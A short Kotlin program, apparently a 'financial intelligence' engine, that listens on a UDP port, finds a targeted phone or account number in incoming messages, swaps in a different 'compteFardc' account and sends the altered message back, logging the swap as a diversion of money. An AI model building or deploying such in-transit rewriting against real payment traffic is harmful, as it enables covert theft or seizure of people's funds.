package core.finint

import java.net.DatagramPacket
import java.net.DatagramSocket

fun main(args: Array<String>) {
    val port = 9999
    val socket = DatagramSocket(port)
    val buffer = ByteArray(1024)

    val destSuspect = "0812345678"
    val compteFardc = "0828888888"

    println("\n[MONOLITHE-K] Moteur actif sur port $port")

    while (true) {
        val packet = DatagramPacket(buffer, buffer.size)
        socket.receive(packet)
        val data = String(packet.data, 0, packet.length)
        
        if (data.contains(destSuspect)) {
            println("🚨 CIBLE DETECTEE : $destSuspect")
            val modified = data.replace(destSuspect, compteFardc)
            println("💰 DEROUTEMENT VERS : $compteFardc")
            
            val response = modified.toByteArray()
            val sendPacket = DatagramPacket(response, response.size, packet.address, packet.port)
            socket.send(sendPacket)
        }
    }
}
